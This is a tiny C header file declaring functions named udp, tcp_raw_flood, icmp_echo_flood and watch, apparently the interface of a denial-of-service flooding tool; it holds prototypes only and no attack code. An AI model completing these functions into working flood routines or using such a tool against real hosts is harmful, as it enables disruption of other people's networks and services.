#pragma once

void watch(int);
void udp(char *, int, int, int);
void tcp_raw_flood(char *, int, int, int, int);
void icmp_echo_flood(char *, int, int, int, int);
